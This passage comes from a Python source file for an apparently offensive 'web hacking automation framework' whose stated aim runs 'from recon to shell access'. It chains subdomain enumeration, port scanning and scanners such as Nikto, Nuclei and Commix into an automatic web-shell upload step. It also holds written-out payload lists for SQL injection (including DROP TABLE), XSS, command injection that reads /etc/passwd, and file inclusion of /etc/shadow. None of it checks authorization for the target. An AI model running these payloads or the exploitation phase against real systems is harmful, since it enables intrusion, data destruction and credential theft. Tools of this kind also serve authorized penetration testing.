        .risk-level {{ display: inline-block; padding: 5px 10px; color: white; border-radius: 3px; font-weight: bold; text-transform: uppercase; }}
        .risk-critical {{ background-color: #f44336; }}
        .risk-high {{ background-color: #ff9800; }}
        .risk-medium {{ background-color: #ffeb3b; color: black; }}
        .risk-low {{ background-color: #4caf50; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background-color: #f2f2f2; font-weight: bold; }}
        .code {{ background-color: #f5f5f5; padding: 10px; font-family: monospace; border-radius: 3px; word-break: break-all; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>WEB PENETRATION TEST REPORT</h1>
        <h2>WebAppSec v1.0 by Braintree - Professional Security Assessment</h2>
        <p>Target: {target} | Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
    
    <div class="container">
        <div class="section">
            <h2>Executive Summary</h2>
            <table>
                <tr><th>Target</th><td>{target}</td></tr>
                <tr><th>Assessment Date</th><td>{datetime.now().strftime('%Y-%m-%d')}</td></tr>
                <tr><th>Subdomains Found</th><td>{len(reconnaissance_data.get('subdomains', []))}</td></tr>
                <tr><th>Web Services</th><td>{len(reconnaissance_data.get('web_services', []))}</td></tr>
                <tr><th>Vulnerabilities Found</th><td>{len(vulnerabilities)}</td></tr>
                <tr><th>Risk Level</th><td>
                    {"<span class='risk-level risk-critical'>CRITICAL</span>" if any(v.get('severity') == 'High' for v in vulnerabilities) else "<span class='risk-level risk-medium'>MEDIUM</span>" if vulnerabilities else "<span class='risk-level risk-low'>LOW</span>"}
                </td></tr>
            </table>
        </div>
        
        <div class="section">
            <h2>Reconnaissance Results</h2>
            <h3>Discovered Subdomains</h3>
            <ul>
                {"".join(f"<li>{sub}</li>" for sub in reconnaissance_data.get('subdomains', [])[:10])}
            </ul>
            
            <h3>Web Services</h3>
            <table>
                <tr><th>URL</th><th>Status</th><th>Title</th><th>Server</th><th>Technology</th></tr>
                {"".join(f"<tr><td>{service['url']}</td><td>{service['status_code']}</td><td>{service['title']}</td><td>{service['server']}</td><td>{', '.join(service['tech_stack'])}</td></tr>" for service in reconnaissance_data.get('web_services', []))}
            </table>
        </div>
        
        <div class="section">
            <h2>Vulnerability Assessment</h2>
            {self._generate_vulnerability_sections(vulnerabilities)}
        </div>
        
        <div class="section">
            <h2>Remediation Recommendations</h2>
            <ul>
                <li><strong>Input Validation:</strong> Implement proper input validation and sanitization</li>
                <li><strong>Parameterized Queries:</strong> Use prepared statements to prevent SQL injection</li>
                <li><strong>Output Encoding:</strong> Encode all user-supplied data in HTML output</li>
                <li><strong>Security Headers:</strong> Implement security headers (CSP, HSTS, etc.)</li>
                <li><strong>Regular Updates:</strong> Keep all software components updated</li>
                <li><strong>WAF Implementation:</strong> Deploy Web Application Firewall</li>
                <li><strong>Security Testing:</strong> Conduct regular security assessments</li>
            </ul>
        </div>
    </div>
</body>
</html>"""
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"{Colors.GREEN}[+] HTML report generated: {report_file}{Colors.END}")
        return report_file
    
    def _generate_vulnerability_sections(self, vulnerabilities):
        """Generate HTML for vulnerability sections"""
        if not vulnerabilities:
            return "<p>No vulnerabilities were detected during this assessment.</p>"
        
        sections = ""
        for i, vuln in enumerate(vulnerabilities, 1):
            severity_class = vuln.get('severity', 'low').lower()
            sections += f"""
            <div class="vulnerability {severity_class}">
                <h3>#{i}: {vuln['type']} 
                    <span class="risk-level risk-{severity_class}">{vuln.get('severity', 'Unknown')}</span>
                </h3>
                <table>
                    <tr><th>URL</th><td><div class="code">{vuln['url']}</div></td></tr>
                    <tr><th>Payload</th><td><div class="code">{vuln.get('payload', 'N/A')}</div></td></tr>
                    <tr><th>Evidence</th><td>{vuln.get('evidence', 'Vulnerability confirmed')}</td></tr>
                </table>
            </div>"""
        
        return sections

class WebHackingFramework:
    """Main web hacking automation framework"""
    
    def __init__(self):
        self.recon = WebRecon()
        self.scanner = VulnerabilityScanner()
        self.exploit = ExploitationEngine()
        self.reporter = ReportGenerator()
        self.version = "2.0"
        
        # Create output directory
        self.output_dir = "output/web_hacking"
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
    
    def print_banner(self):
        """Display framework banner"""
        banner = pyfiglet.figlet_format("WebAppSec", font="slant")
        print(f"{Colors.CYAN}{banner}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.WHITE}WebAppSec v1.0 - Web Hacking Complete Automation Framework{Colors.END}")
        print(f"{Colors.GREEN}by Braintree - From Recon to Shell Access{Colors.END}")
        print(f"{Colors.YELLOW}{'-' * 77}{Colors.END}")
        print(f"{Colors.BLUE}Reconnaissance | Exploitation | Professional Reporting{Colors.END}")
        print(f"{Colors.YELLOW}{'-' * 77}{Colors.END}\n")
    
    def comprehensive_scan(self, target):
        """Run comprehensive web application security assessment"""
        print(f"{Colors.BOLD}{Colors.CYAN}COMPREHENSIVE WEB SECURITY ASSESSMENT{Colors.END}")
        print(f"{Colors.WHITE}Target: {target}{Colors.END}\n")
        
        reconnaissance_data = {}
        
        # Phase 1: Reconnaissance
        print(f"{Colors.BOLD}Phase 1: Reconnaissance{Colors.END}")
        
        # Subdomain enumeration
        subdomains = self.recon.subdomain_enum(target)
        reconnaissance_data['subdomains'] = subdomains
        
        # theHarvester reconnaissance
        harvester_data = self.recon.the_harvester_recon(target)
        reconnaissance_data['harvester'] = harvester_data
        
        # Combine discovered targets
        all_discovered = subdomains + harvester_data.get('subdomains', [])
        
        all_targets = list(set([target] + all_discovered))[:15]  # Limit and deduplicate
        
        # Phase 2: Port Scanning
        print(f"\n{Colors.BOLD}Phase 2: Port Scanning{Colors.END}")
        open_services = self.recon.port_scan(all_targets)
        reconnaissance_data['port_scan'] = open_services
        
        # Phase 3: Web Service Discovery
        print(f"\n{Colors.BOLD}Phase 3: Web Service Discovery{Colors.END}")
        web_services = self.recon.web_discovery(all_targets)
        reconnaissance_data['web_services'] = web_services
        
        # Phase 3b: Technology Analysis with WhatWeb
        print(f"\n{Colors.BOLD}Phase 3b: Technology Stack Analysis{Colors.END}")
        web_urls = [service['url'] for service in web_services]
        if web_urls:
            whatweb_results = self.recon.whatweb_analysis(web_urls)
            reconnaissance_data['technology_stack'] = whatweb_results
        
        # Phase 4: Directory Discovery
        print(f"\n{Colors.BOLD}Phase 4: Directory Discovery{Colors.END}")
        discovered_paths = self.recon.directory_bruteforce(web_services[:5])  # Limit to avoid timeout
        reconnaissance_data['discovered_paths'] = discovered_paths
        
        # Phase 5: Advanced Vulnerability Scanning
        print(f"\n{Colors.BOLD}Phase 5: Advanced Vulnerability Assessment{Colors.END}")
        
        # Nikto web vulnerability scan
        print(f"{Colors.CYAN}[*] Running Nikto web vulnerability scan...{Colors.END}")
        nikto_results = self.recon.nikto_vulnerability_scan(web_urls[:5])
        reconnaissance_data['nikto_vulnerabilities'] = nikto_results
        
        # Nuclei template-based scanning
        print(f"{Colors.CYAN}[*] Running Nuclei template-based vulnerability scan...{Colors.END}")
        nuclei_results = self.recon.nuclei_scan(web_urls[:5])
        reconnaissance_data['nuclei_vulnerabilities'] = nuclei_results
        
        # XSStrike XSS scanning
        print(f"{Colors.CYAN}[*] Running XSStrike XSS vulnerability scan...{Colors.END}")
        xsstrike_results = self.recon.xsstrike_scan(web_urls[:5])
        reconnaissance_data['xsstrike_results'] = xsstrike_results
        
        # WordPress vulnerability scanning
        print(f"{Colors.CYAN}[*] Running WPScan WordPress vulnerability analysis...{Colors.END}")
        wpscan_results = self.recon.wpscan_analysis(web_urls[:5])
        reconnaissance_data['wpscan_results'] = wpscan_results
        
        # Command injection scanning with Commix
        print(f"{Colors.CYAN}[*] Running Commix command injection scan...{Colors.END}")
        commix_results = self.recon.commix_command_injection_scan(web_urls[:5])
        reconnaissance_data['commix_results'] = commix_results
        
        # JavaScript analysis and endpoint discovery
        print(f"{Colors.CYAN}[*] Running JavaScript analysis and endpoint discovery...{Colors.END}")
        js_results = self.recon.javascript_analysis(web_urls[:5])
        reconnaissance_data['javascript_analysis'] = js_results
        
        # Custom vulnerability scans (existing)
        print(f"{Colors.CYAN}[*] Running additional custom vulnerability scans...{Colors.END}")
        
        # SQL Injection
        self.scanner.scan_sql_injection(web_services, discovered_paths)
        
        # XSS
        self.scanner.scan_xss(web_services, discovered_paths)
        
        # Command Injection
        self.scanner.scan_command_injection(web_services, discovered_paths)
        
        # File Inclusion
        self.scanner.scan_file_inclusion(web_services, discovered_paths)
        
        vulnerabilities = self.scanner.vulnerabilities
        
        # Combine all scan results with custom scan results
        
        # Add Nikto results
        for url, nikto_vulns in nikto_results.items():
            for vuln in nikto_vulns:
                vulnerabilities.append({
                    'type': 'Web Vulnerability (Nikto)',
                    'url': url,
                    'payload': 'N/A',
                    'severity': vuln['severity'],
                    'evidence': vuln['description']
                })
        
        # Add Nuclei results
        for url, nuclei_vulns in nuclei_results.items():
            for vuln in nuclei_vulns:
                severity = 'High'
                if '[critical]' in vuln.lower():
                    severity = 'Critical'
                elif '[high]' in vuln.lower():
                    severity = 'High'
                elif '[medium]' in vuln.lower():
                    severity = 'Medium'
                elif '[low]' in vuln.lower():
                    severity = 'Low'
                
                vulnerabilities.append({
                    'type': 'Template-Based Vulnerability (Nuclei)',
                    'url': url,
                    'payload': 'N/A',
                    'severity': severity,
                    'evidence': vuln
                })
        
        # Add XSStrike results
        for url, xss_vulns in xsstrike_results.items():
            for vuln in xss_vulns:
                vulnerabilities.append({
                    'type': 'Cross-Site Scripting (XSStrike)',
                    'url': url,
                    'payload': 'N/A',
                    'severity': 'High',
                    'evidence': vuln
                })
        
        # Add WPScan results
        for url, wp_data in wpscan_results.items():
            if wp_data.get('vulnerabilities', 0) > 0:
                vulnerabilities.append({
                    'type': 'WordPress Vulnerability (WPScan)',
                    'url': url,
                    'payload': 'N/A',
                    'severity': 'Medium',
                    'evidence': f"WordPress vulnerabilities detected: {wp_data.get('vulnerabilities', 0)}"
                })
        
        # Add Commix results
        for url, cmd_vulns in commix_results.items():
            for vuln in cmd_vulns:
                vulnerabilities.append({
                    'type': 'Command Injection (Commix)',
                    'url': url,
                    'payload': 'N/A',
                    'severity': 'Critical',
                    'evidence': vuln
                })
        
        # Add JavaScript analysis findings (potential secrets)
        for url, js_data in js_results.items():
            if js_data.get('secrets'):
                for secret in js_data['secrets'][:3]:  # Limit to avoid noise
                    vulnerabilities.append({
                        'type': 'Information Disclosure (JavaScript)',
                        'url': url,
                        'payload': 'N/A',
                        'severity': 'Medium',
                        'evidence': f"Potential secret found in JavaScript: {secret[:50]}..."
                    })
        
        # Phase 6: Exploitation (if vulnerabilities found)
        if vulnerabilities:
            print(f"\n{Colors.BOLD}Phase 6: Exploitation Attempts{Colors.END}")
            shells = self.exploit.attempt_web_shell_upload(vulnerabilities)
            reconnaissance_data['shells'] = shells
        
        # Phase 7: Report Generation
        print(f"\n{Colors.BOLD}Phase 7: Report Generation{Colors.END}")
        report_file = self.reporter.generate_html_report(
            target, reconnaissance_data, vulnerabilities, self.output_dir
        )
        
        # Save scan data for future report generation
        scan_data = {
            'target': target,
            'reconnaissance': reconnaissance_data,
            'vulnerabilities': vulnerabilities,
            'timestamp': datetime.now().isoformat(),
            'report_file': report_file
        }
        
        data_file = f"{self.output_dir}/scan_data_{self.reporter.timestamp}.json"
        with open(data_file, 'w') as f:
            json.dump(scan_data, f, indent=2)
        print(f"{Colors.GREEN}[+] Scan data saved: {data_file}{Colors.END}")
        
        # Display summary
        print(f"\n{Colors.BOLD}{Colors.GREEN}ASSESSMENT COMPLETED{Colors.END}")
        print(f"Target: {target}")
        print(f"Subdomains: {len(subdomains)}")
        print(f"Web Services: {len(web_services)}")
        print(f"Vulnerabilities: {len(vulnerabilities)}")
        if vulnerabilities:
            print(f"Critical/High: {len([v for v in vulnerabilities if v.get('severity') in ['Critical', 'High']])}")
        print(f"Report: {report_file}")
        print(f"Data File: {data_file}")
        
        return {
            'target': target,
            'reconnaissance': reconnaissance_data,
            'vulnerabilities': vulnerabilities,
            'report': report_file
        }
    
    def _test_sql_injection_direct(self, target):
        """Direct SQL injection testing with common parameters"""
        import urllib.parse
        
        sql_payloads = [
            "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", 
            "'; DROP TABLE users--", "' UNION SELECT NULL--", 
            "' AND 1=1--", "' AND 1=2--", "1' UNION SELECT NULL--",
            "admin'--", "admin'/*", "' OR 'x'='x", "' OR 'x'='x'--", "' OR 'x'='x'/*",
            "'; WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--"
        ]
        
        # Common parameter names that might be vulnerable
        test_params = ['id', 'user', 'username', 'email', 'search', 'q', 'query', 'category', 'page', 'item', 'product', 'login']
        
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
        for param in test_params:
            for payload in sql_payloads:
                try:
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                    
                    start_time = time.time()
                    response = session.get(test_url, timeout=15)
                    end_time = time.time()
                    
                    response_time = end_time - start_time
                    
                    # Check for SQL error patterns
                    sql_errors = [
                        'mysql_fetch', 'mysql_num_rows', 'mysql_error', 'mysqli',
                        'you have an error in your sql syntax', 'warning: mysql',
                        'ORA-', 'Microsoft Access Driver', 'Microsoft JET Database',
                        'PostgreSQL query failed', 'pg_exec', 'pg_query',
                        'sqlite_exec', 'sqlite_query', 'sqlite_step',
                        'SQL syntax', 'mysql_connect', 'mysql_select_db'
                    ]
                    
                    # Check for time-based SQL injection (if response took longer than expected)
                    time_based_detected = False
                    if 'WAITFOR DELAY' in payload and response_time > 4:
                        time_based_detected = True
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            self.scanner.vulnerabilities.append({
                                'type': 'SQL Injection (Error-based)',
                                'url': test_url,
                                'payload': payload,
                                'severity': 'High',
                                'evidence': f"Database error detected: {error}"
                            })
                            print(f"{Colors.RED}[!] SQL injection found: {param} parameter{Colors.END}")
                            break
                    
                    if time_based_detected:
                        self.scanner.vulnerabilities.append({
                            'type': 'SQL Injection (Time-based)',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High',
                            'evidence': f"Response delayed by {response_time:.2f} seconds"
                        })
                        print(f"{Colors.RED}[!] Time-based SQL injection found: {param} parameter{Colors.END}")
                        
                except requests.RequestException as e:
                    continue
    
    def _test_xss_direct(self, target):
        """Direct XSS testing with common parameters"""
        import urllib.parse
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload=alert(\'XSS\')>',
            '"><script>alert(\'XSS\')</script>',
            "</script><script>alert('XSS')</script>"
        ]
        
        # Parameters commonly vulnerable to XSS
        test_params = ['q', 'search', 'query', 'keyword', 'term', 'name', 'message', 'comment', 'title', 'description']
        
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
        for param in test_params:
            for payload in xss_payloads:
                try:
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                    response = session.get(test_url, timeout=10)
                    
                    if payload in response.text and response.status_code == 200:
                        self.scanner.vulnerabilities.append({
                            'type': 'Cross-Site Scripting (XSS)',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'Medium',
                            'evidence': f"Payload reflected in response"
                        })
                        print(f"{Colors.RED}[!] XSS found: {param} parameter{Colors.END}")
                        break
                            
                except requests.RequestException:
                    continue
    
    def _test_command_injection_direct(self, target):
        """Direct command injection testing"""
        import urllib.parse
        
        cmd_payloads = [
            "; whoami", "| whoami", "` whoami `", "$(whoami)", "&& whoami",
            "; id", "| id", "` id `", "$(id)", "&& id",
            "; ls -la", "| ls -la", "&& dir",
            "; cat /etc/passwd", "| cat /etc/passwd"
        ]
        
        # Parameters that might be vulnerable to command injection
        test_params = ['cmd', 'exec', 'command', 'ping', 'ip', 'host', 'file', 'path', 'dir']
        
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
        for param in test_params:
            for payload in cmd_payloads:
                try:
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                    response = session.get(test_url, timeout=15)
                    
                    # Look for command execution indicators
                    indicators = ['uid=', 'gid=', 'root:', '/bin/', 'Volume in drive', 'total ', 'drwx']
                    
                    if any(indicator in response.text for indicator in indicators):
                        self.scanner.vulnerabilities.append({
                            'type': 'Command Injection',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'Critical',
                            'evidence': f"Command execution indicators found"
                        })
                        print(f"{Colors.RED}[!] Command injection found: {param} parameter{Colors.END}")
                        break
                        
                except requests.RequestException:
                    continue
    
    def _test_file_inclusion_direct(self, target):
        """Direct file inclusion testing"""
        import urllib.parse
        
        lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc//passwd",
            "/etc/passwd%00",
            "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "../../../etc/shadow",
            "../../../etc/hosts",
            "..\\..\\..\\boot.ini",
            "C:\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        file_params = ['file', 'page', 'include', 'path', 'doc', 'document', 'template', 'view']
        
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
        for param in file_params:
            for payload in lfi_payloads:
                try:
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                    response = session.get(test_url, timeout=10)
                    
                    # Check for file inclusion indicators
                    file_indicators = [
                        'root:', 'localhost', 'bin/bash', '[boot loader]',
                        'daemon:', 'www-data:', 'nobody:',
                        '# localhost name resolution', '127.0.0.1'
                    ]
                    
                    if any(indicator in response.text for indicator in file_indicators):
                        self.scanner.vulnerabilities.append({
                            'type': 'Local File Inclusion (LFI)',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High',
                            'evidence': f"File system access detected"
                        })
                        print(f"{Colors.RED}[!] LFI found: {param} parameter{Colors.END}")
                        break
                        
                except requests.RequestException:
                    continue
    
    def generate_previous_scan_report(self):
        """Generate report from previous scan data"""
        print(f"{Colors.YELLOW}[*] Scanning for previous assessment data...{Colors.END}")
        
        # Look for existing scan data files
        scan_files = []
        if os.path.exists(self.output_dir):
            for file in os.listdir(self.output_dir):
                if file.endswith('.json') and 'scan_data' in file:
                    scan_files.append(file)
        
        if not scan_files:
            print(f"{Colors.RED}[-] No previous scan data found in {self.output_dir}{Colors.END}")
            print(f"{Colors.YELLOW}[*] Run a comprehensive assessment first to generate scan data{Colors.END}")
            return
        
        # Display available scan files
        print(f"{Colors.GREEN}[+] Found {len(scan_files)} previous scan(s):{Colors.END}")
        for i, file in enumerate(scan_files, 1):
            timestamp = file.replace('scan_data_', '').replace('.json', '')
            print(f"  [{i}] {timestamp}")
        
        try:
            choice = input(f"\n{Colors.WHITE}Select scan to generate report (1-{len(scan_files)}): {Colors.END}")
            index = int(choice) - 1
            
            if 0 <= index < len(scan_files):
                selected_file = scan_files[index]
                data_file = os.path.join(self.output_dir, selected_file)
                
                print(f"{Colors.YELLOW}[*] Loading scan data from {selected_file}...{Colors.END}")
                
                with open(data_file, 'r') as f:
                    scan_data = json.load(f)
                
                # Generate HTML report from loaded data
                report_file = self.reporter.generate_html_report(
                    scan_data.get('target', 'Unknown'),
                    scan_data.get('reconnaissance', {}),
                    scan_data.get('vulnerabilities', []),
                    self.output_dir
                )
                
                print(f"{Colors.GREEN}[+] Report regenerated successfully: {report_file}{Colors.END}")
                
                # Display summary
                vuln_count = len(scan_data.get('vulnerabilities', []))
                recon_data = scan_data.get('reconnaissance', {})
                print(f"\n{Colors.BOLD}Report Summary:{Colors.END}")
                print(f"Target: {scan_data.get('target', 'Unknown')}")
                print(f"Subdomains: {len(recon_data.get('subdomains', []))}")
                print(f"Web Services: {len(recon_data.get('web_services', []))}")
                print(f"Vulnerabilities: {vuln_count}")
                if vuln_count > 0:
                    high_critical = len([v for v in scan_data.get('vulnerabilities', []) if v.get('severity') in ['Critical', 'High']])
                    print(f"Critical/High Risk: {high_critical}")
                
            else:
                print(f"{Colors.RED}[-] Invalid selection{Colors.END}")
                
        except (ValueError, KeyError, json.JSONDecodeError) as e:
            print(f"{Colors.RED}[-] Error processing scan data: {e}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[-] Unexpected error: {e}{Colors.END}")
    
    def run(self):
        """Run the web hacking framework interactively (called from main framework menu)"""
        # Interactive mode
        while True:
            try:
                print(f"\n{Colors.BOLD}{Colors.CYAN}WEB HACKING FRAMEWORK - MAIN MENU{Colors.END}")
                print(f"{Colors.CYAN}{'-' * 70}{Colors.END}")
                print(f"{Colors.WHITE}[1] Comprehensive Website Assessment{Colors.END}")
                print(f"{Colors.WHITE}[2] Subdomain Enumeration Only{Colors.END}")
                print(f"{Colors.WHITE}[3] Vulnerability Scanning Only{Colors.END}")
                print(f"{Colors.WHITE}[4] Generate Report from Previous Scan{Colors.END}")
                print(f"{Colors.WHITE}[0] Exit{Colors.END}")
                print(f"{Colors.CYAN}{'-' * 70}{Colors.END}")
                
                choice = input(f"\n{Colors.WHITE}[WebAppSec] Select option: {Colors.END}").strip()
                
                if choice == '1':
                    target = input(f"{Colors.WHITE}Enter target domain: {Colors.END}").strip()
                    if target:
                        self.comprehensive_scan(target)
                
                elif choice == '2':
                    target = input(f"{Colors.WHITE}Enter target domain: {Colors.END}").strip()
                    if target:
                        subdomains = self.recon.subdomain_enum(target)
                        print(f"\n{Colors.GREEN}Found {len(subdomains)} subdomains:{Colors.END}")
                        for sub in subdomains:
                            print(f"  {sub}")
                
                elif choice == '3':
                    target = input(f"{Colors.WHITE}Enter target URL: {Colors.END}").strip()
                    if target:
                        if not target.startswith(('http://', 'https://')):
                            target = 'http://' + target
                        
                        print(f"{Colors.CYAN}[*] Starting vulnerability scan on {target}...{Colors.END}")
                        
                        # Reset vulnerabilities for fresh scan
                        self.scanner.vulnerabilities = []
                        
                        web_services = [{'url': target}]
                        
                        # Test for SQL injection with common parameters
                        print(f"{Colors.YELLOW}[*] Testing SQL injection vulnerabilities...{Colors.END}")
                        self._test_sql_injection_direct(target)
                        
                        # Test for XSS with common parameters  
                        print(f"{Colors.YELLOW}[*] Testing XSS vulnerabilities...{Colors.END}")
                        self._test_xss_direct(target)
                        
                        # Test for command injection
                        print(f"{Colors.YELLOW}[*] Testing command injection vulnerabilities...{Colors.END}")
                        self._test_command_injection_direct(target)
                        
                        # Test for file inclusion
                        print(f"{Colors.YELLOW}[*] Testing file inclusion vulnerabilities...{Colors.END}")
                        self._test_file_inclusion_direct(target)
                        
                        print(f"\n{Colors.GREEN}Found {len(self.scanner.vulnerabilities)} vulnerabilities{Colors.END}")
                        
                        # Show found vulnerabilities
                        if self.scanner.vulnerabilities:
                            print(f"\n{Colors.BOLD}Vulnerabilities Found:{Colors.END}")
                            for i, vuln in enumerate(self.scanner.vulnerabilities, 1):
                                severity_color = Colors.RED if vuln['severity'] in ['High', 'Critical'] else Colors.YELLOW
                                print(f"  {severity_color}[{i}] {vuln['type']} - {vuln['severity']}{Colors.END}")
                                print(f"      URL: {vuln['url']}")
                                print(f"      Payload: {vuln['payload']}")
                                print(f"      Evidence: {vuln['evidence']}")
                                print()
                
                elif choice == '4':
                    self.generate_previous_scan_report()
                
                elif choice == '0' or choice.lower() == 'exit':
                    print(f"\n{Colors.GREEN}[*] Returning to main WebAppSec menu...{Colors.END}")
                    break
                
                else:
                    print(f"{Colors.RED}[-] Invalid choice. Please try again.{Colors.END}")
                
                if choice in ['1', '2', '3', '4']:
                    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[*] Returning to main WebAppSec menu...{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}[-] Unexpected error: {e}{Colors.END}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="WebAppSec v1.0 - Web Hacking Complete Automation Framework by Braintree",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 ReconFramework.py                    # Interactive mode
  python3 ReconFramework.py -t example.com    # Single target assessment
  python3 ReconFramework.py -t example.com --quick    # Quick scan mode
        """
    )
    
    parser.add_argument('-t', '--target', help='Target domain to assess')
    parser.add_argument('--quick', action='store_true', help='Quick scan mode (faster but less thorough)')
    parser.add_argument('--output', default='output/web_hacking', help='Output directory')
    
    args = parser.parse_args()
    
    # Create framework instance
    framework = WebHackingFramework()
    framework.output_dir = args.output
    
    # Handle command line arguments
    if args.target:
        framework.print_banner()
        
        if args.quick:
            print(f"{Colors.YELLOW}[*] Running in quick scan mode{Colors.END}")
        
        result = framework.comprehensive_scan(args.target)
        
    else:
        # Interactive mode
        framework.print_banner()
        
        while True:
            try:
                print(f"\n{Colors.BOLD}{Colors.CYAN}WEB HACKING FRAMEWORK - MAIN MENU{Colors.END}")
                print(f"{Colors.CYAN}{'-' * 50}{Colors.END}")
                print(f"{Colors.WHITE}[1] Comprehensive Website Assessment{Colors.END}")
                print(f"{Colors.WHITE}[2] Subdomain Enumeration Only{Colors.END}")
                print(f"{Colors.WHITE}[3] Vulnerability Scanning Only{Colors.END}")
                print(f"{Colors.WHITE}[4] Generate Report from Previous Scan{Colors.END}")
                print(f"{Colors.WHITE}[0] Exit{Colors.END}")
                print(f"{Colors.CYAN}{'-' * 50}{Colors.END}")
                
                choice = input(f"\n{Colors.WHITE}[WebAppSec] Select option: {Colors.END}").strip()
                
                if choice == '1':
                    target = input(f"{Colors.WHITE}Enter target domain: {Colors.END}").strip()
                    if target:
                        framework.comprehensive_scan(target)
                
                elif choice == '2':
                    target = input(f"{Colors.WHITE}Enter target domain: {Colors.END}").strip()
                    if target:
                        subdomains = framework.recon.subdomain_enum(target)
                        print(f"\n{Colors.GREEN}Found {len(subdomains)} subdomains:{Colors.END}")
                        for sub in subdomains:
                            print(f"  {sub}")
                
                elif choice == '3':
                    target = input(f"{Colors.WHITE}Enter target URL: {Colors.END}").strip()
                    if target:
                        web_services = [{'url': target}]
                        framework.scanner.scan_sql_injection(web_services, {})
                        framework.scanner.scan_xss(web_services, {})
                        print(f"\n{Colors.GREEN}Found {len(framework.scanner.vulnerabilities)} vulnerabilities{Colors.END}")
                
                elif choice == '4':
                    framework.generate_previous_scan_report()
                
                elif choice == '0' or choice.lower() == 'exit':
                    print(f"\n{Colors.GREEN}[*] Thank you for using WebAppSec Framework!{Colors.END}")
                    print(f"{Colors.CYAN}[*] Happy Hacking!{Colors.END}")
                    break
                
                else:
                    print(f"{Colors.RED}[-] Invalid choice. Please try again.{Colors.END}")
                
                if choice in ['1', '2', '3']:
                    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[*] Exiting...{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}[-] Unexpected error: {e}{Colors.END}")

if __name__ == "__main__":
    main()